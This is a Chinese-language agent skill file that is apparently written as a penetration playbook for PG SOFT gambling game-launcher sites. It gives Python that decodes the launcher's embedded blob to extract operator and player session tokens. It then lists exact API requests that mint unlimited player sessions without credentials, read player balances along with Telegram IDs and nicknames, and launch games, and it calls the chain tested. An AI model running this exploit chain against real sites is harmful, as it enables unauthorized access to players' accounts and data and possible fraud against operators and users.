---
name: 商燕飞·软盘
description: "PG SOFT 游戏启动器渗透 (/api/index?keys=): blob解密→会话铸币→余额/游戏启动."
version: 1.0.0
license: MIT
platforms: [linux, macos, windows]
metadata:
    tags: [pentest, pgsoft, gambling, api]
    category: ctf-pentest
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# PG SOFT 游戏聚合启动器渗透

## 触发条件
- URL 形如 `https://<site>/api/index?keys=<uuid>&a` (结尾常带截断的 `&a`)
- 响应 HTML title = `game-launcher BY PG SOFT®`
- 目标为 PG SOFT 电子/棋牌聚合站 (TG bot 分发链接)

## 架构速览
- 商户站: Laravel + nginx + Cloudflare, 通常只有 2 个路由: `GET /api/index` (启动器), `GET /api/user` (常为 500 死路由)
- 上游聚合商 (PG SOFT 官方白标): lobby 域 `public.<rand>.com`, API 域 `api.<rand>.com`, proxy 域 `public-api.<rand>.com`, 核心域 `m.pgjksjk.com` / `public.pgf-as2gek5.com`
- 启动器 HTML 尾部 IIFE 内有 base64 MessagePack blob

## 利用链 (已实测)

### 1. 解密启动器 blob
```python
m = re.search(r'\(("|\'|\\")([A-Za-z0-9+/=]{100,})("|\'|\\")\)', html)
b64 = m.group(2); b64 += '=' * (-len(b64) % 4)
data = base64.b64decode(b64)
# 提取: ci(32hex=ops), tid, 以及 5 个 lobby URL: ot=<OPERATOR_TOKEN>&ops=<PLAYER_SESSION>
```

### 2. 会话铸币 (无需玩家凭据)
```
POST https://api.<lobby-domain>/web-api/auth/session/v1/verifyOperatorPlayerSession
FormData: os=<ops> otk=<ot> gi=0 btt=1
→ {"dt":{"pid","pcd","tk","cc","cs","nkn","gm":[...]}}  # tk=玩家 token, 每次调用都返回新 tk, 无限次
```
- 响应含 `bau`=web-api/game-proxy/, `sdn`=阿里云节点名, `eatk`=加密附加token
- `pcd` 常为用户 TG ID, `nkn` 为昵称

### 3. 余额 + 游戏列表 (读)
```
POST https://api.<lobby-domain>/game-api/lobby/WebLobby/Get
otk=<ot>&atk=<tk>&lang=zh&du=https://<lobby-host>&cc=<cc>&pf=1
→ dt.wlii.bli.bl = {bbl,cbl,tbl} 玩家余额; gmi.gm = 168 款游戏
```

### 4. 启动游戏 (仅需 ot+gi, 无玩家校验)
```
POST https://public-api.<lobby-domain>/web-api/operator-proxy/v1/Game/GetLaunchURLHTML
ot=<ot>&gi=<gameid>&ut=game-entry
→ 游戏启动页 HTML (内含加密启动 token 与新 UUID, 1MB WebGL 客户端)
```

### 5. 其他可用端点
- `game-api/lobby/Resource/GetAllGamesResources` (图标资源)
- `game-api/lobby/gameInfo/v1/getGameDetails`
- `game-api/lobby/tournament/v1/GetInitTournaments`
- `game-api/lobby/Favorite/update`, `Rating/*`

## 关键陷阱
1. **`ops` ≠ 运营密钥**: 它是 operator_player_session; `ot` 才是 operator_token。lobby URL 参数映射: `ot→operator_token`, `ops→operator_player_session`, `op→operator_param`
2. **字段名**: verify 用 `os`+`otk`; WebLobby/Get 用 `otk`+`atk`; GetLaunchURLHTML 用 `ot` (缺它会报 `cd:2002 OperatorToken required`)
3. **token 时效**: verify 返回的 tk 有效但 WebLobby/Get 偶尔 500 — 重新 verify 拿新 tk 即可
4. **Cash/v1 TransferIn/TransferOut → 404** = 该运营方钱包功能禁用 (前端 secretKey=null, 钱包按钮不渲染), 资金转移不可行
5. **operator-proxy 只有 /v1/Game/GetLaunchURLHTML**; Player/Operator/Report/Cash 全 404
6. **keys 参数必须是合法 UUID**, 玩家 ID/数字/pid/os 均报 `{"code":1,"exception":"param error"}`
7. **启动器静态**: 任意参数 (a/op/login_url/rurl/l/btt/tourid) 全部忽略, 输出不变; 每次请求 ops 相同
8. 源站 (AWS/阿里云) 常封锁直连仅放行 Cloudflare — 直连超时属正常, 别浪费时间
9. `/api/user` 无条件 500 (Whoops 页) = 死路由; POST→405 可确认 GET-only
10. 错误响应特征: 404 nginx 页 (非 Laravel), 405 Laravel MethodNotAllowed (路由存在但方法错), 500 Whoops (处理器异常)

## 信息泄露点 (写报告用)
- `x-envoy-decorator-operation: lobby.backend-team.svc.cluster.local:80/*` — k8s 命名空间
- `x-apisix-upstream-status` — APISIX 网关; `server: PWS/x` — PG Soft 自研
- `sdn: api-ali-hongkong-b` — 阿里云香港节点; CDN: wcdnga.com (网宿)
- 游戏 API 域: `api.6ctuslwqz.com` / `api.tkpusjc86.com` (从启动页 blob 泄露)

## 验证步骤
1. 拿到 launcher HTML 且 blob 解码出 ot/ops ✓
2. verifyOperatorPlayerSession 返回 pid/tk ✓
3. WebLobby/Get 返回余额+游戏列表 ✓ = 会话铸币链闭环
